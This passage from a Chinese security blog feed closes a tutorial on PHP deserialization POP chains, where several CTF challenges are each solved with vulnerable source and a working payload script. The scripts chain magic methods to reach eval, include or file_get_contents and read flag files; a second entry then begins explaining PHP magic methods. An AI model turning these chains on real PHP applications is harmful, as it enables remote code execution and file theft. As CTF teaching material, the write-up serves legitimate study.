class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;params);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>思路分析：先找链子的头和尾，头部明显是GET传参，尾部是<code>Uwant</code>类中的<code>getshell</code>，然后往上倒推，<code>Uwant</code>类中的<code>__get()</code>中调用了<code>getshell</code>，<code>Show</code>类中的<code>toString</code>调用了<code>__get()</code>，然后<code>Hello</code>类中的<code>__destruct()</code>，而我们GET传参之后会先进入<code>__destruct()</code>，这样子头和尾就连上了，所以说完整的链子就是：</p><p><code>头 -&gt; Hello::__destruct() -&gt; Show::__toString() -&gt; Uwant::__get() -&gt; Uwant::getshell -&gt; 尾</code></p><p>至于魔术方法具体是怎么调用的这就不讲了，请看上一篇文章，这儿就简单提一下，在<code>Hello</code>类中我们要把<code>$this-&gt;str</code>赋值成对象，下面<code>echo</code>出来才能调用<code>Show</code>类中的<code>__toString()</code>，然后再把<code>Show</code>类中的<code>$this-&gt;str[&#39;str&#39;]</code>赋值成对象，来调用<code>Uwant</code>类中的<code>__get()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uwant</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$params</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Hello();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Uwant();</span><br><span class="line"><span class="variable">$a</span> -&gt; str = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/17/n9vPsLjwZ7hOa4z.png" alt="image.png"></p><p>这样子就出来了，想当初这道题还是我们团队的考核题，那时候我做了半天都没做出来，害，慢慢进步吧哈哈</p><h2 id="例题解析三-——-2020-mrctf-ezpop"><a href="#例题解析三-——-2020-mrctf-ezpop" class="headerlink" title="例题解析三 —— 2020 mrctf ezpop"></a>例题解析三 —— 2020 mrctf ezpop</h2><p>这道题选自mrctf中的ezpop，可以在buuctf上复现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路分析：仍然是先找链子的头和尾，头部依然是一个GET传参，而尾部在<code>Modifier</code>类中的<code>append()</code>方法中，因为里面有个<code>include</code>可以完成任意文件包含，那我们很容易就可以想到用伪协议来读文件，综合上面的提示，应该flag就是在flag.php中，我们把它读出来就好；找到尾部之后往前倒推，在<code>Modifier</code>类中的<code>__invoke()</code>调用了<code>append()</code>，然后在<code>Test</code>类中的<code>__get()</code>返回的是<code>$function()</code>，可以调用<code>__invoke()</code>，再往前<code>Show</code>类中的<code>__toString()</code>可以调用<code>__get()</code>，然后在<code>Show</code>类中的<code>__wakeup()</code>中有一个正则匹配，可以调用<code>__toString()</code>，然后当我们传入字符串，反序列化之后最先进入的就是<code>__wakeup()</code>，这样子头和尾就连上了，如下图(来自LTLT)：</p><p><img src="https://i.loli.net/2021/08/17/7KHtl9Vrvqxy6TO.png" alt="image.png"></p><p><code>头 -&gt; Show::__wakeup() -&gt; Show::__toString() -&gt; Test::__get() -&gt; Modifier::__invoke() -&gt; Modifier::append -&gt; 尾</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$a</span> -&gt; source = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; str = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span> -&gt; p = <span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/17/GIdZ3vsAupmLhf4.png" alt="image.png"></p><p>成功拿下</p><h2 id="例题解析四-——-2021-强网杯-赌徒"><a href="#例题解析四-——-2021-强网杯-赌徒" class="headerlink" title="例题解析四 —— 2021 强网杯 赌徒"></a>例题解析四 —— 2021 强网杯 赌徒</h2><p>这道题选自2021年强网杯，名字为赌徒：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sayhello();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;Get_hint(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hi</span> = <span class="keyword">new</span>  Start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个代码看起来有点长，不过也不要担心，按照我们上面讲的方法一步一步来就行了，很多代码都没啥用，也就那么一回事儿</p><p>分析：首先依然是找到头和尾，头部依然是一个GET传参，而尾部可以看到<code>Room</code>类中有个<code>Get_hint()</code>方法，里面有一个<code>file_get_contents</code>，可以实现任意文件读取，我们就可以利用这个读取flag文件了，然后就是往前倒推，<code>Room</code>类中<code>__invoke()</code>方法调用了<code>Get_hint()</code>，然后<code>Room</code>类的<code>__get()</code>里面有个<code>return $function()</code>可以调用<code>__invoke()</code>，再往前看，<code>Info</code>类中的<code>__toString()</code>中有<code>Room</code>类中不存在的属性，所以可以调用<code>__get()</code>，然后<code>Start</code>类中有个<code>_sayhello()</code>可以调用<code>__toString()</code>，然后在<code>Start</code>类中<code>__wakeup()</code>方法中直接调用了<code>_sayhello()</code>，而我们知道的是，输入字符串之后就会先进入<code>__wakeup()</code>，这样头和尾就连上了</p><p><img src="https://i.loli.net/2021/08/17/NpIGM2TxJ4bktKq.png" alt="image.png"></p><p>有了思路我们就直接开始构造，一般找思路我们是从尾到头，而构造则是直接从头到尾</p><p><code>头 -&gt; Start::__wakeup() -&gt; Start::_sayhello() -&gt; Info::__toString() -&gt; Room::__get() -&gt; Room::invoke() -&gt; Room::Get_hint() </code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Start();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Info();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Room();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> Room();</span><br><span class="line"><span class="variable">$a</span> -&gt; name = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; file[<span class="string">&#x27;filename&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span> -&gt; a = <span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/17/DlchJdyVz281YFW.png" alt="image.png"></p><p>成功打通，注意要把前面的<code>hi</code>去掉再进行base64编码才能得到flag哈</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里通过四个例子基本上算是把php反序列化中构造pop链讲清楚了吧，这四个例子都不算很难，在实际的挖洞中要审的链子可能比这个长的多，但我相信方法都是差不多的；如果这里还有哪里没看懂的，可以去看上一篇文章讲魔术方法的，那里讲了各种魔术方法的调用情况，把所有魔术方法都搞清楚了，再加上细心审代码，构造pop链也就没啥问题了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;pop链的构造-下篇&quot;&gt;&lt;a href=&quot;#pop链的构造-下篇&quot; class=&quot;headerlink&quot; title=&quot;pop链的构造(下篇)&quot;&gt;&lt;/a&gt;pop链的构造(下篇)&lt;/h1&gt;&lt;p&gt;上篇文章中我们详细介绍了魔术方法及调用它们的条件，那么这篇文章就来研究在实例中如何调用它们，并且把它们连成一条pop链，首先，我们来看看什么是pop链&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="php" scheme="https://arsenetang.github.io/tags/php/"/>
    
    <category term="反序列化" scheme="https://arsenetang.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>反序列化篇之pop链的构造(上)</title>
    <link href="https://arsenetang.github.io/2021/08/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bpop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0(%E4%B8%8A)/"/>
    <id>https://arsenetang.github.io/2021/08/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bpop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0(%E4%B8%8A)/</id>
    <published>2021-08-14T16:00:00.000Z</published>
    <updated>2021-08-15T15:17:25.426Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pop链的构造-上篇"><a href="#pop链的构造-上篇" class="headerlink" title="pop链的构造(上篇)"></a>pop链的构造(上篇)</h1><p>php反序列化漏洞，是web安全漏洞中非常重要的一种，无论是在ctf中还是实战中都有很广泛的应用，而一般在一些大型ctf比赛中，反序列化甚至是web题中的签到题，所以说把这基础打扎实就很重要；而在php反序列化中，构造pop链肯定是一个绕不开的话题，接下来我们来介绍构造pop链的思路和过程，上篇我们先来详细介绍魔术方法，然后下篇通过多个案例介绍利用pop链将魔术方法串起来</p><span id="more"></span><h2 id="魔术方法测试"><a href="#魔术方法测试" class="headerlink" title="魔术方法测试"></a>魔术方法测试</h2><p>我理解的pop链，就是用一条链子将一堆不同类中的魔术方法串起来，让没有关系的类扯上关系，由前一个魔术方法调用后一个魔术方法，连成一条链子，最终达成我们的目的，所以说了解每个魔术方法的调用条件就非常重要了，接下来我们来做一些测试：</p><h2 id="一-construct-和-destruct"><a href="#一-construct-和-destruct" class="headerlink" title="一.__construct()和__destruct()"></a>一.<code>__construct()</code>和<code>__destruct()</code></h2><p><code>__construct</code>：当对象<strong>创建</strong>时会自动调用，注意是创建的时候，也就是说有<code>new</code>的时候就会调用，在<code>unserialize</code>时是不会被自动调用的</p><p><code>__destruct()</code>：当对象被<strong>销毁</strong>时会自动调用；当新对象创建后，它后面一定会被自动销毁，也就是调用<code>__construct</code>后一定会调用<code>__destruct</code>；或者我们直接传入一个对象，它后面被销毁时也会调用<code>__destruct</code></p><p><img src="https://i.loli.net/2021/08/13/MURxSsHl8Pi9f2X.png" alt="image.png"></p><p>可以看到，创建对象<code>a</code>时调用了<code>__construct</code>，然后输出序列化后的对象<code>a</code>，最后在销毁对象<code>a</code>时调用了<code>__destruct</code></p><p><img src="https://i.loli.net/2021/08/13/IWG9vPVmf5aBoOs.png" alt="image.png"></p><p>再看这个，我们没有创建对象，而是直接传入了一个对象，所以说它没有调用<code>__construct</code>却调用了<code>__destruct</code></p><p><img src="https://i.loli.net/2021/08/13/h25vsIXq4MATpdy.png" alt="image.png"></p><p>最后看这个，因为我们既创建了对象<code>a</code>，也传入了对象，所以说它<code>__destruct</code>被调用了两次，因为它两个对象最后都会被销毁</p><h2 id="二-sleep-和-wakeup"><a href="#二-sleep-和-wakeup" class="headerlink" title="二.__sleep()和__wakeup()"></a>二.<code>__sleep()</code>和<code>__wakeup()</code></h2><p><code>__sleep()</code> ：在对象被序列化<strong>之前</strong>被调用，就是说看到<code>serialize</code>时就会被调用，而且是先调用后再执行序列化</p><p><code>__wakeup()</code>:  将在字符串被反序列化之后被立即调用，就是说看到<code>unserialize</code>后就会被立即调用</p><p><img src="https://i.loli.net/2021/08/14/A1TEoFNpjBLUKhZ.png" 